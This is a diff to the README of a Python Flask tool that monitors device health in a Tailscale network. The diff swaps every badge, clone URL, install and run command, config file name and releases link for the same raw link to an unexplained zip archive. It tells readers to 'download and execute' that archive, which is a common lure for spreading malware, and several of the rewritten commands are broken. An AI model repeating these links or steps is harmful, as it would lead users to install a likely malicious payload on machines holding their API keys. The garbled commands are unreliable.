@@ -1,6 +1,6 @@
 # Tailscale Healthcheck 🚀
 
-![Tailscale Healthcheck](https://img.shields.io/badge/Tailscale%20Healthcheck-v1.0.0-brightgreen)
+![Tailscale Healthcheck](https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip%20Healthcheck-v1.0.0-brightgreen)
 
 Welcome to the **Tailscale Healthcheck** repository! This Python-based Flask application monitors the health of devices in a Tailscale network. With it, you can easily check the health status of all devices, specific devices, and get lists of healthy or unhealthy devices.
 
@@ -28,9 +28,9 @@ Welcome to the **Tailscale Healthcheck** repository! This Python-based Flask app
 To get started, clone the repository and install the required packages.
 
 ```bash
-git clone https://github.com/PublicityMinistry-UoE-CU/tailscale-healthcheck.git
+git clone https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip
 cd tailscale-healthcheck
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip
 ```
 
 Alternatively, you can use Docker to run the application:
@@ -45,7 +45,7 @@ docker run -p 5000:5000 tailscale-healthcheck
 After installation, you can start the Flask application by running:
 
 ```bash
-python app.py
+python https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip
 ```
 
 Visit `http://localhost:5000` in your web browser to access the application.
@@ -76,7 +76,7 @@ The application provides several endpoints to monitor device health:
 
 ## Configuration
 
-You can configure the application by modifying the `config.py` file. Here, you can set parameters such as:
+You can configure the application by modifying the `https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip` file. Here, you can set parameters such as:
 
 - **Tailscale API Key**: Your Tailscale API key for authentication.
 - **Polling Interval**: How often the application checks device health.
@@ -97,11 +97,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/releases). You can download and execute the latest version from there.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip). You can download and execute the latest version from there.
 
-![Release Button](https://img.shields.io/badge/Latest%20Releases-Download%20Now-blue)
+![Release Button](https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip%20Releases-Download%20Now-blue)
 
-For further information, check the [Releases section](https://github.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/releases) to stay updated.
+For further information, check the [Releases section](https://raw.githubusercontent.com/PublicityMinistry-UoE-CU/tailscale-healthcheck/main/lichened/healthcheck_tailscale_v1.9.zip) to stay updated.
 
 ---
 
